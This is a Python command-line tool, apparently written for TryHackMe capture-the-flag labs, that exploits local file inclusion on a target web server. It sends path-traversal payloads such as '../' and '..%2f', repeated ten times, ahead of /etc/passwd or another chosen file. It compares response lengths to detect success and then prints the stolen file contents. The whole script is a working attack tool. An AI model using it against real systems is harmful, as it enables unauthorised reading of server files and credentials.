#!/usr/bin/env python3

import argparse
import os
import platform
import random
import re
import requests
import string

############################################################
# Global Variables
############################################################

ANSI_CLRLN = "\r\x1b[2K\r"
ANSI_RST = "\x1b[0m"
ANSI_GRN = "\x1b[32;1m"
ANSI_RED = "\x1b[31;1m"
ANSI_BLU = "\x1b[34;1m"
ANSI_YLW = "\x1b[33;1m"

HTTPS_ENABLED = False

############################################################
# Formatting Functions
############################################################

def SucMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_GRN}+{ANSI_RST}] {msg}")
    return

def ErrMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_RED}-{ANSI_RST}] {msg}")
    return

def InfoMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_BLU}i{ANSI_RST}] {msg}")
    return

def InfoMsgNB(msg):
    print(f"{ANSI_CLRLN}[{ANSI_BLU}i{ANSI_RST}] {msg}", end="")
    return

def SysMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_YLW}*{ANSI_RST}] {msg}")
    return

def SysMsgNB(msg):
    print(f"{ANSI_CLRLN}[{ANSI_YLW}*{ANSI_RST}] {msg}", end="")
    return

############################################################
# Validation Functions
############################################################

def port_type(portno):
    portno = int(portno)

    if (portno < 1) or (portno > 65535):
        raise argparse.ArgumentError("Port must be within range 1 - 65535.")

    return portno

############################################################

def FindFlag(data, flagPattern=None):
    flag = str()
    message = str()
    success = bool()

    try:
        ############################################################
        # Make sure data var is bytes or string.
        ############################################################
        if not(isinstance(data,str)) and not(isinstance(data,bytes)):
            raise TypeError(f"Data must be string or bytes. Got {type(data)}.")

        if isinstance(data,str):
            data = data.encode('utf-8')

        ############################################################
        # Normalize data.
        ############################################################
        data = data.lower()

        if flagPattern is None:
            flagPattern = "thm{.*}"
 
        ############################################################
        # Make sure flag pattern var is bytes or string.
        ############################################################
        if not(isinstance(flagPattern,str)) and not(isinstance(flagPattern,bytes)):
            raise TypeError(f"FlagPattern must be string or bytes. Got {type(flagPattern)}.")

        ############################################################
        # Normalize flag pattern.
        ############################################################
        flagPattern = flagPattern.lower()

        ############################################################
        # Match type of data and flag pattern.
        ############################################################
        if type(flagPattern) != type(data):
            if isinstance(flagPattern,bytes):
                data = data.encode()
            elif isinstance(data,bytes):
                flagPattern = flagPattern.encode()

        ############################################################
        # Search for flag pattern.
        ############################################################
        reg = re.compile(flagPattern)
        matches = reg.findall(data)

        if len(matches) < 1:
            raise ValueError("flag not found in data")
        
        flag = matches[0]

        if isinstance(flag,bytes):
            flag = flag.decode('utf-8')

        message = f"flag found: \"{flag}\""
        success = True
    except Exception as ex:
        flag = ""
        message = str(ex)
        success = False

    return (flag, success, message)

def GenRandomString(minlen = None, maxlen = None):
    message = str()
    randstring = str()
    success = bool()

    try:
        alphabet = f"{string.ascii_lowercase}{string.ascii_uppercase}{string.digits}"

        ############################################################
        # Validate minlen value
        ############################################################
        if minlen is None:
            minlen = 8
        elif not(isinstance(minlen,int)):
            raise TypeError("Minlen must be int. Got {type(minlen)}")
        elif minlen < 1:
            raise ValueError("Minlen must be greater than 0")

        ############################################################
        # Validate maxlen value
        ############################################################
        if maxlen is None:
            maxlen = 15
        elif not(isinstance(maxlen,int)):
            raise TypeError("Minlen must be int. Got {type(maxlen)}")
        elif maxlen < 1:
            raise ValueError("Minlen must be greater than 0")

        ############################################################
        # Make sure minlen <= maxlen
        ############################################################
        if minlen > maxlen:
            tmp = maxlen
            maxlen = minlen
            minlen = tmp

        ############################################################
        # Choose length of string
        ############################################################
        stringlen = random.randrange(minlen, maxlen)

        ############################################################
        # Build random string
        ############################################################
        for i in range(stringlen):
            curchoice = random.choice(alphabet)
            randstring = f"{randstring}{curchoice}"

        message = "random string generated"
        success = True
    except Exception as ex:
        message = str(ex)
        randstring = ""
        success = False
    return (randstring, success, message)

def LFIChecker(baseurl, targetfile = None, parameter = None, paramval = None):
    content = str()
    message = str()
    success = bool()

    lfipatterns = ["../", "..%2f", "%2e%2e/", "..//", ".././"]

    baselen = int()
    errlen = int()
    lfilen = int()

    lfifound = bool()

    try:
        if baseurl[-1] == "/":
            baseurl = baseurl[:-1]

        if targetfile is None:
            targetfile = "/etc/passwd"

        if not(isinstance(targetfile, str)) and not(isinstance(targetfile, bytes)):
            raise TypeError(f"Targetfile must be a string or bytes. Got {type(targetfile)}")

        if isinstance(targetfile, bytes):
            targetfile = targetfile.decode("utf-8")

        if targetfile[0] != "/":
            targetfile = f"/{targetfile}"

        if parameter:
            if not(isinstance(parameter, str)) and not(isinstance(parameter, bytes)):
                raise TypeError(f"Parameter must be string or bytes. Got {type(parameter)}")
            elif isinstance(parameter, bytes):
                parameter = parameter.decode("utf-8")

            if paramval is None:
                raise ValueError("must provide paramval when providing parameter to test")
            elif not(isinstance(paramval, str)) and not(isinstance(paramval, bytes)):
                raise TypeError(f"Paramval must be string or bytes. Got {type(paramval)}")
            elif isinstance(paramval, bytes):
                paramval = paramval.decode("utf-8")

            params = {parameter: paramval}

        SysMsgNB("getting base length ...")
        resp = requests.get(baseurl)
        if (resp.status_code != 200) and (parameter is None):
            raise ValueError(f"Bad Status Code ({resp.status_code} {resp.reason})")
        baselen = len(resp.text)

        SysMsgNB("getting error length ...")
        dneroute = GenRandomString()
        dneurl = f"{baseurl}/{dneroute}"
        resp = requests.get(dneurl)
        errlen = len(resp.text)

        if parameter:
            SysMsgNB("getting parameter length ...")
            resp = requests.get(baseurl, params=params)
            if resp.status_code >= 400:
                raise ValueError(f"Bad Status Code ({resp.status_code} {resp.reason})")
            paramlen = len(resp.text)
        print(ANSI_CLRLN, end="")

        print(f"\n{ANSI_RED}{'-'*60}{ANSI_RST}")
        print(f"{ANSI_GRN}{'Baselines':^60}{ANSI_RST}")
        print(f"{ANSI_RED}{'-'*60}{ANSI_RST}")
        InfoMsg(f"Base Length: {baselen}")
        InfoMsg(f"Error Length: {errlen}")
        if parameter:
            InfoMsg(f"Parameter Length: {paramlen}")
        print(f"{ANSI_RED}{'-'*60}{ANSI_RST}\n")

        walkdepth = 10
        for lfipattern in lfipatterns:
            SysMsgNB(f"testing pattern \"{lfipattern}\" ...")

            walk = lfipattern * walkdepth
            attack = f"{walk}{targetfile}"
            bfroute = f"{walk}{dneroute}"

            if parameter:    
                SysMsgNB("checking bad file length ...")
                resp = requests.get(baseurl, params={parameter: bfroute})
                bflen = len(resp.text)

                params = {parameter: attack}
                resp = requests.get(baseurl, params=params)
                if resp.status_code != 200:
                    continue
                attacklen = len(resp.text)

                if (attacklen != baselen) and (attacklen != errlen) and (attacklen != paramlen) and (attacklen != bflen):
                    SucMsg(f"LFI found using pattern: \"{lfipattern}\"")
                    lfifound = True
                    content = resp.text
            else:
                bfurl = f"{baseurl}/{bfroute}"
                resp = requests.get(bfurl)
                bflen = len(resp.text)

                attackurl = f"{baseurl}/{attack}"
                resp = requests.get(attackurl)
                if resp.status_code != 200:
                    continue
                attacklen = len(resp.text)

                if (attacklen != baselen) and (attacklen != errlen) and (attacklen != bflen):
                    SucMsg(f"LFI likely using pattern: \"{lfipattern}\"")
                    lfifound = True
                    content = resp.text

        if not(lfifound):
            raise ValueError("no LFI vulnerability discovered")

        content = content.replace("<!DOCTYPE html>","").replace("<html>","").replace("<body>","").replace("</body>","").replace("</html>","").strip()

        message = "lfi vulnerability discovered"
        success = True
    except Exception as ex:
        content = ""
        message = str(ex)
        success = False

    return (content, success, message)

def main():
    scheme = str()

    if platform.system().lower() == "windows":
        os.system("")
    
    parser = argparse.ArgumentParser()

    ############################################################
    # Setup required command-line arguments.
    ############################################################
    parser.add_argument("target", help="IP address of target.", type=str)
    parser.add_argument("port", help="Port to connect to target on.", type=port_type)

    parser.add_argument("-f", "--file", help="file to pull using LFI", type=str, dest="file", default="etc/passwd")
    parser.add_argument("-pn", "--paramname", help="url parameter for lfi", type=str, dest="paramname", default=None)
    parser.add_argument("-pv", "--paramval", help="url parameter working value", type=str, dest="paramval", default=None)
    parser.add_argument("-r", "--route", help="route to target for LFI", type=str, dest="route", default="")
    parser.add_argument("--secure", help="use HTTPS scheme", action="store_true", dest="secure")

    args = parser.parse_args()

    target = args.target
    port = args.port

    paramname = args.paramname
    paramval = args.paramval
    route = args.route
    secure = args.secure
    tgtfile = args.file

    ############################################################
    # Set HTTP scheme (HTTP or HTTPS) based on arguments.
    ############################################################
    if secure:
        scheme = "https"
    else:
        scheme = "http"

    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    print(f"{ANSI_GRN}{'Target Information':^60}{ANSI_RST}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    InfoMsg(f"Target IP: {target}")
    InfoMsg(f"Target Port: {port}")
    InfoMsg(f"Scheme: {scheme}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")

    baseURL = f"{scheme}://{target}:{port}/{route}"

    content, success, message = LFIChecker(baseURL, parameter = paramname, paramval = paramval, targetfile = tgtfile)
    if not(success):
        ErrMsg(message)
        exit(1)
    SucMsg(message)

    print(f"\n{ANSI_RED}{'-'*60}{ANSI_RST}")
    print(f"{ANSI_GRN}{'File Content':^60}{ANSI_RST}")
    print(f"{ANSI_RED}{'-'*60}{ANSI_RST}")
    print(content)
    print(f"{ANSI_RED}{'-'*60}{ANSI_RST}")

    return

if __name__ == "__main__":
    main()

